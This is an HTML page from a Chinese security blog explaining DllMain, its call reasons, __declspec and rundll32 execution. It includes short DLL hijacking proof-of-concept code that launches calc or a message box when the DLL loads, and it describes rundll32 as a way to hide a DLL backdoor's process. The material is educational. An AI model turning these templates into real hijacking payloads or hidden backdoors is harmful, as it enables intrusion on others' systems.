@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>DllMain与rundll32详解</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/projects/" title="Projects">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-terminal-fill" viewBox="0 0 16 16"><path d="M0 3a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3zm9.5 5.5h-3a.5.5 0 0 0 0 1h3a.5.5 0 0 0 0-1zm-6.354-.354a.5.5 0 1 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708L4.793 6.5 3.146 8.146z"/></svg> Projects
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/tools/" title="Tools">
+                        Tools
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h2 id="0x00-dllmain">0x00 DllMain</h2>
+<p>对于动态链接库，DllMain是一个<strong>可选的</strong>入口函数。</p>
+<h3 id="程序调用dll中的导出函数的流程">程序调用DLL中的导出函数的流程</h3>
+<ul>
+<li>程序调用Windows API <code>LoadLibrary</code></li>
+<li>操作系统寻找LoadLibrary所加载的DLL文件</li>
+<li>操作系统将DLL文件加载至目标程序进程的内存空间</li>
+<li>程序自动调用<code>DllMain</code>函数</li>
+<li>程序调用DLL中导出函数</li>
+</ul>
+<p><strong>如果DLL被多次<code>LoadLibrary</code>，那么<code>DllMain</code>只执行一次，引用基数+1。</strong></p>
+<h3 id="dllmain的原型">DllMain的原型</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">BOOL WINAPI <span style="color:#a6e22e">DllMain</span>(
+  _In_ HINSTANCE hinstDLL, <span style="color:#75715e">// 指向自身的句柄
+</span><span style="color:#75715e"></span>  _In_ DWORD fdwReason, <span style="color:#75715e">// 调用原因
+</span><span style="color:#75715e"></span>  _In_ LPVOID lpvReserved <span style="color:#75715e">// 隐式加载和显式加载
+</span><span style="color:#75715e"></span>);
+</code></pre></div><h2 id="0x01-dllmain调用原因">0x01 DllMain调用原因</h2>
+<p>其中<code>fdwReason</code>用来表示Dll被调用的状态，一共分为四种：</p>
+<ul>
+<li>DLL_PROCESS_ATTACH 被进程加载</li>
+<li>DLL_PROCESS_DETACH 被进程释放</li>
+<li>DLL_THREAD_ATTACH  被线程加载</li>
+<li>DLL_THREAD_DETACH  被线程释放</li>
+</ul>
+<p>在DllMain中通常为了捕获DLL被调用的方式来进行某些动作：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+　<span style="color:#66d9ef">switch</span> (ul_reason_for_call)
+　{
+　　<span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:
+　　　printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">process attach of dll&#34;</span>);
+　　　<span style="color:#66d9ef">break</span>;
+　　<span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
+　　　printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">thread attach of dll&#34;</span>);
+　　　<span style="color:#66d9ef">break</span>;
+　　<span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
+　　　printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">thread detach of dll&#34;</span>);
+　　　<span style="color:#66d9ef">break</span>;
+　　<span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
+　　　printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">process detach of dll&#34;</span>);
+　　　<span style="color:#66d9ef">break</span>;
+　}
+　<span style="color:#66d9ef">return</span> TRUE;
+}
+</code></pre></div><h2 id="0x02-那些用于测试dll劫持的dllmain-poc">0x02 那些用于测试DLL劫持的DllMain POC</h2>
+<ul>
+<li><a href="https://cxsecurity.com/issue/WLB-2018090232">https://cxsecurity.com/issue/WLB-2018090232</a></li>
+<li><a href="https://cxsecurity.com/issue/WLB-2015010114">https://cxsecurity.com/issue/WLB-2015010114</a></li>
+</ul>
+<p>在测试很多DLL劫持的漏洞时，都喜欢用DllMain，是因为DllMain被进程加载或者释放都会自动调用运行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+BOOL WINAPI <span style="color:#a6e22e">DllMain</span> (
+            HANDLE    hinstDLL,
+            DWORD     fdwReason,
+            LPVOID    lpvReserved)
+{
+    <span style="color:#66d9ef">switch</span> (fdwReason)
+  {
+  <span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:
+    owned();
+  <span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
+        <span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
+        <span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
+  <span style="color:#66d9ef">break</span>;
+  }
+  <span style="color:#66d9ef">return</span> TRUE;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">owned</span>() {
+  MessageBox(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;iExplorer DLL Hijacked\Hadji Samir&#34;</span>, <span style="color:#e6db74">&#34;POC&#34;</span>, MB_OK);
+}
+
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#define DLLIMPORT __declspec (dllexport)
+</span><span style="color:#75715e"></span> 
+DLLIMPORT <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">HrCreateConverter</span>() { evil(); }
+ 
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">evil</span>()
+{
+  WinExec(<span style="color:#e6db74">&#34;calc&#34;</span>, <span style="color:#ae81ff">0</span>);
+  exit(<span style="color:#ae81ff">0</span>);
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+</code></pre></div><h2 id="0x03-__declspec">0x03 __declspec</h2>
+<p><code>__declspec</code>是Microsoft VC中专用的关键字，它配合着一些属性可以对标准C/C++进行扩充。<code>__declspec</code>关键字应该出现在声明的前面。</p>
+<p><code>__declspec(dllexport)</code>用于Windows中的动态库中，声明导出函数、类、对象等供外面调用，省略给出.def文件。即将函数、类等声明为导出函数，供其它程序调用，作为动态库的对外接口函数、类等。</p>
+<p><code>__declspec(dllimport)</code>用于Windows中，从别的动态库中声明导入函数、类、对象等供本动态库或exe文件使用。当你需要使用DLL中的函数时，往往不需要显示地导入函数，编译器可自动完成。</p>
+<h2 id="0x04-关于rundll32">0x04 关于rundll32</h2>
+<p>Rundll32.exe是什么？顾名思意，&ldquo;执行32位的DLL文件&rdquo;。它的作用是执行DLL文件中的内部函数，这样在进程当中，只会有Rundll32.exe，而不会有DLL后门的进程，这样，就实现了进程上的隐藏。</p>
+<p>&ndash; 百度百科</p>
+<p>经过如上解释，可以总结为，rundll32能够运行一个32位的dll文件，并且在进程列表中只能看到rundll32.exe，但是遍历rundll32.exe的模块列表可以看到进程加载的dll。</p>
+<hr>
+<p><strong>并不是所有的dll都能够被rundll32运行。</strong> 为何这么说，因为rundll32只支持特定的函数声明方式，并且该函数必须在dll文件的导出表中。关于导出表的知识可以阅读 - 《Windows PE权威指南》 👍</p>
+<p>rundll32.exe支持的函数原型如下：</p>
+<pre><code>VOID CALLBACK FunctionName (HWND hwnd,HINSTANCE hinst,LPTSTR lpCmdLine,INT nCmdShow);
+</code></pre><p>通过原型可以发现，与Windows平台下的<code>WinMain</code>一模一样，可以理解为rundll32调用的函数就是一段代码的入口函数。</p>
+<p>下面来写一个支持rundll32运行的dll：</p>
+<ol>
+<li>使用visual studio新建一个dll工程，并声明函数：<code>rundll</code></li>
+</ol>
+<pre><code>#include &lt;Windows.h&gt;
+
+
+extern &quot;C&quot; __declspec(dllexport) void rundll(HWND hwnd,HINSTANCE hinst,LPTSTR lpCmdLine,INT nCmdShow){
+
+	MessageBox(NULL,TEXT(&quot;-Test-&quot;),TEXT(&quot;Rundll32&quot;),MB_OK);
+
+}
+</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/00fc4fb53fc6fe2066e0273a84b03e28.png" alt="2019-10-02-19-58-36"></p>
+<ol start="2">
+<li>使用rundll32运行dll</li>
+</ol>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1dfbb642309ac2a2a741c529751ce50c.png" alt="2019-10-02-20-00-18"></p>
+<p>通过进程列表查看：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7c1e7c60d47a3d76d7f47a40c1354d68.png" alt="2019-10-02-20-00-54"></p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f7afbb1ba62e1a1280cb3d1df141ad21.png" alt="2019-10-02-20-04-38"></p>
+<p>使用<code>wmic process get commandline</code>也可以获得命令行详情：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b29994c93ed7dd8514360df92fbca405.png" alt="2019-10-02-20-02-49"></p>
+<p>还有一种方式是获得该进程加载的模块，这是最精确的了；但windows 7不能直接看到，需要借助工具。（win10可以通过任务查看器看到..）</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/55c8bd2002161bf855fffea28e31c05d.png" alt="2019-10-02-20-08-24"></p>
+<p><strong>这个dll是没有DllMain也能够正常运行的，并不是所有的dll都有DllMain这个函数</strong></p>
+<p>我经过实验后发现，一个dll有没有DllMain完全取决于当前这个dll对于功能的需求，如果对装载方式的状态没有特定的要求，完全可以省去编写DllMain，因为DllMain不是一个导出函数，永远是一个由系统被动调用的函数。</p>
+
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
+<script>
+(function(){
+  let plantumlPrefix = "language-plantuml";
+  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
+    let image = document.createElement("IMG");
+    image.loading = 'lazy'; 
+    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
+    code.parentNode.insertBefore(image, code);
+    code.style.display = 'none';
+  });
+})();
+</script>
+
+</body>
+</html>
